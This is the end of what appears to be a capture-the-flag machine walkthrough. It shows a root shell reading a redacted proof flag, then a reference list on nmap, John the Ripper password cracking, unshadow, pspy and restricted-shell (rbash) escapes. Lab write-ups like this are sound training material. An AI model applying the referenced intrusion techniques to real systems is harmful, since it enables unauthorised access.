-rw-r--r--  1 root                             root                               66 Jul  7  2020 .selected_editor
cat proof.txt
f<REDACTED>6
exit
```

Nice!

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [chkrootkit - Homepage](https://www.chkrootkit.org/)
- [John the Ripper - Homepage](https://www.openwall.com/john/)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [OpenSSH  - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [passwd - Wikipedia](https://en.wikipedia.org/wiki/Passwd)
- [pspy - GitHub](https://github.com/DominicBreuker/pspy)
- [rbash escape | rbash restricted shell escape](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [The Restricted Shell - Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [unshadow - John - Kali Tools](https://www.kali.org/tools/john/#unshadow)
- [unzip - Linux manual page](https://linux.die.net/man/1/unzip)
- [wget - Linux manual page](https://man7.org/linux/man-pages/man1/wget.1.html)
